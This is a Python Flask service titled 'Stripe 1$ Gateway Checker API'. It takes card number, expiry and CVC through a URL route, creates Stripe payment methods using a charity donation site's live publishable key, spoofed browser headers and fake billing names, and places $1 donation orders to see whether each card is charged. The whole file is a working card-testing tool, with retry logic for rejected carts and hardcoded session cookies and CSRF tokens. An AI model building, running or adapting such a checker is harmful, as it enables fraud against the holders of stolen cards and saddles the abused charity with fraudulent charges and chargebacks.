from flask import Flask, jsonify
import requests
import re
import json

app = Flask(__name__)

# Fetch a new cart token
def fetch_cart_token():
    cart_headers = {
        'authority': 'www.onamissionkc.org',
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.onamissionkc.org',
        'referer': 'https://www.onamissionkc.org/donate-now',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    }

    cart_data = {
        'amount': {
            'value': 100,
            'currencyCode': 'USD',
        },
        'donationFrequency': 'ONE_TIME',
        'feeAmount': None,
    }

    try:
        response = requests.post(
            'https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b',
            headers=cart_headers,
            json=cart_data,
            timeout=30
        )
        
        if response.status_code != 200:
            return {
                'success': False, 
                'message': f'HTTP error: {response.status_code}',
                'raw_response': response.text
            }
        
        response_data = response.json()
        if 'redirectUrlPath' not in response_data:
            error_msg = response_data.get('error', {}).get('message', 'Failed to create new cart')
            return {
                'success': False, 
                'message': error_msg,
                'raw_response': response.text
            }
        
        # Extract cart token from redirect URL
        redirect_url = response_data['redirectUrlPath']
        match = re.search(r'cartToken=([^&]+)', redirect_url)
        if not match:
            return {
                'success': False, 
                'message': 'Unable to extract cart token',
                'raw_response': response.text
            }
        
        return {
            'success': True, 
            'cartToken': match.group(1),
            'raw_response': response.text
        }
    except Exception as e:
        return {
            'success': False, 
            'message': str(e),
            'raw_response': str(e)
        }

# Create payment method with Stripe API
def create_payment_method(card_number, exp_month, exp_year, cvc):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'billing_details[address][city]': 'Oakford',
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': 'Siles Avenue',
        'billing_details[address][line2]': '',
        'billing_details[address][postal_code]': '19053',
        'billing_details[address][state]': 'PA',
        'billing_details[name]': 'Geroge Washintonne',
        'billing_details[email]': 'grogeh@gmail.com',
        'type': 'card',
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_year]': exp_year,
        'card[exp_month]': exp_month,
        'allow_redisplay': 'unspecified',
        'payment_user_agent': 'stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent',
        'referrer': 'https://www.onamissionkc.org',
        'time_on_page': '145592',
        'client_attribution_metadata[client_session_id]': '22e7d0ec-db3e-4724-98d2-a1985fc4472a',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': '7904f40e-9588-48b2-bc6b-fb88e0ef71d5',
        'guid': '18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd',
        'muid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
        'sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
        'key': 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
        '_stripe_account': 'acct_1LwocDFHMGxIu0Ep',
    }

    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=30
        )
        
        response_data = response.json()
        
        if response.status_code != 200:
            error_msg = response_data.get('error', {}).get('message', 'Unknown error')
            return {
                'success': False, 
                'message': error_msg, 
                'payment_method_id': None,
                'raw_response': response.text
            }
        
        if 'id' not in response_data:
            return {
                'success': False, 
                'message': 'Invalid response from Stripe', 
                'payment_method_id': None,
                'raw_response': response.text
            }
        
        return {
            'success': True, 
            'payment_method_id': response_data['id'],
            'raw_response': response.text
        }
    except Exception as e:
        return {
            'success': False, 
            'message': str(e), 
            'payment_method_id': None,
            'raw_response': str(e)
        }

# Process payment with merchant API
def process_payment(cart_token, payment_method_id):
    # Use the specified crumb
    crumb = 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1'
    
    cookies = f'crumb={crumb}; ' \
              'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' \
              'ss_cvt=1760724937850; ' \
              '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' \
              '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67'

    headers = {
        'authority': 'www.onamissionkc.org',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.onamissionkc.org',
        'referer': f'https://www.onamissionkc.org/checkout?cartToken={cart_token}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-csrf-token': crumb,
    }

    json_data = {
        'email': 'grogeh@gmail.com',
        'subscribeToList': False,
        'shippingAddress': {
            'id': '',
            'firstName': '',
            'lastName': '',
            'line1': '',
            'line2': '',
            'city': '',
            'region': 'NY',
            'postalCode': '',
            'country': '',
            'phoneNumber': '',
        },
        'createNewUser': False,
        'newUserPassword': None,
        'saveShippingAddress': False,
        'makeDefaultShippingAddress': False,
        'customFormData': None,
        'shippingAddressId': None,
        'proposedAmountDue': {
            'decimalValue': '1',
            'currencyCode': 'USD',
        },
        'cartToken': cart_token,
        'paymentToken': {
            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
            'token': payment_method_id,
            'type': 'STRIPE',
        },
        'billToShippingAddress': False,
        'billingAddress': {
            'id': '',
            'firstName': 'Davide',
            'lastName': 'Washintonne',
            'line1': 'Siles Avenue',
            'line2': '',
            'city': 'Oakford',
            'region': 'PA',
            'postalCode': '19053',
            'country': 'US',
            'phoneNumber': '+1361643646',
        },
        'savePaymentInfo': False,
        'makeDefaultPayment': False,
        'paymentCardId': None,
        'universalPaymentElementEnabled': True,
    }

    try:
        response = requests.post(
            'https://www.onamissionkc.org/api/2/commerce/orders',
            headers=headers,
            json=json_data,
            cookies={'cookie': cookies},
            timeout=30
        )
        
        response_text = response.text
        response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
        
        if response.status_code != 200:
            return {
                'success': False, 
                'message': f'HTTP error: {response.status_code}',
                'raw_response': response_text
            }
        
        # Check for error in the response
        if 'error' in response_data:
            return {
                'success': False, 
                'message': response_data.get('error', 'Unknown error'),
                'raw_response': response_text
            }
        
        # Check for crumb failure
        if response_data.get('crumbFail') is True:
            return {
                'success': False, 
                'message': f"Crumb failure: {response_data.get('error', 'Invalid crumb')}",
                'raw_response': response_text
            }
        
        # Check for failureType
        if 'failureType' in response_data:
            return {
                'success': False, 
                'message': response_data['failureType'],
                'raw_response': response_text
            }
        
        # Check for payment status in the response
        # Look for indicators of successful payment
        if 'paymentStatus' in response_data and response_data['paymentStatus'] in ['PAID', 'CAPTURED', 'COMPLETED']:
            return {
                'success': True, 
                'message': 'CHARGED',
                'raw_response': response_text
            }
        
        # Check for order status
        if 'status' in response_data and response_data['status'] in ['COMPLETED', 'SUCCESS']:
            return {
                'success': True, 
                'message': 'CHARGED',
                'raw_response': response_text
            }
        
        # If we can't determine success from the response, assume failure
        return {
            'success': False, 
            'message': 'Unable to determine payment status',
            'raw_response': response_text
        }
    except Exception as e:
        return {
            'success': False, 
            'message': str(e),
            'raw_response': str(e)
        }

@app.route('/gate=stripe1$/cc=<card_info>')
def check_card(card_info):
    # Parse card information from pipe format
    try:
        card_parts = card_info.split('|')
        if len(card_parts) < 4:
            return jsonify({
                'status': 'ERROR',
                'message': 'Invalid card format. Expected: number|month|year|cvc',
                'raw_response': 'Invalid card format'
            })
        
        card_number = card_parts[0]
        exp_month = card_parts[1]
        exp_year = card_parts[2]
        cvc = card_parts[3]
        
        # Format year to 4 digits if needed
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
            
    except Exception as e:
        return jsonify({
            'status': 'ERROR',
            'message': f'Error parsing card information: {str(e)}',
            'raw_response': str(e)
        })
    
    # Validate card details
    if not all([card_number, exp_month, exp_year, cvc]):
        return jsonify({
            'status': 'DECLINED',
            'message': 'Missing card details',
            'response': 'MISSING_CARD_DETAILS',
            'raw_response': 'Missing card details'
        })
    
    # Step 1: Create payment method with Stripe
    stripe_result = create_payment_method(card_number, exp_month, exp_year, cvc)
    if not stripe_result['success']:
        return jsonify({
            'status': 'DECLINED',
            'message': 'Your card was declined',
            'response': stripe_result['message'],
            'payment_method_id': stripe_result['payment_method_id'],
            'raw_response': stripe_result['raw_response']
        })
    
    payment_method_id = stripe_result['payment_method_id']
    
    # Step 2: Get cart token
    cart_result = fetch_cart_token()
    if not cart_result['success']:
        return jsonify({
            'status': 'ERROR',
            'message': 'Unable to create new cart',
            'response': cart_result['message'],
            'payment_method_id': payment_method_id,
            'raw_response': cart_result['raw_response']
        })
    
    cart_token = cart_result['cartToken']
    
    # Step 3: Process payment with retry logic
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        payment_result = process_payment(cart_token, payment_method_id)
        
        if payment_result['success']:
            # Success
            return jsonify({
                'status': 'CHARGED',
                'message': 'Your card has been charged $1.00 successfully.',
                'response': 'CHARGED',
                'payment_method_id': payment_method_id,
                'raw_response': payment_result['raw_response']
            })
        
        # Handle specific errors that require a new cart token
        if payment_result['message'] in ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION']:
            cart_result = fetch_cart_token()
            if not cart_result['success']:
                return jsonify({
                    'status': 'ERROR',
                    'message': 'Unable to create new cart',
                    'response': cart_result['message'],
                    'payment_method_id': payment_method_id,
                    'raw_response': cart_result['raw_response']
                })
            cart_token = cart_result['cartToken']
            retry_count += 1
            continue
        
        # Other failures
        return jsonify({
            'status': 'DECLINED',
            'message': 'Your card was declined',
            'response': f"PAYMENT_DECLINED [{payment_result['message']}]",
            'payment_method_id': payment_method_id,
            'raw_response': payment_result['raw_response']
        })
    
    # Max retries reached
    return jsonify({
        'status': 'ERROR',
        'message': 'Unable to process payment due to persistent errors',
        'response': f"MAX_RETRIES_EXCEEDED {card_number}|{exp_month}|{exp_year}|{cvc}",
        'payment_method_id': payment_method_id,
        'raw_response': 'Max retries exceeded'
    })

@app.route('/')
def index():
    return jsonify({
        'message': 'Stripe 1$ Gateway Checker API',
        'usage': '/gate=stripe1$/cc={card_number}|{exp_month}|{exp_year}|{cvc}'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
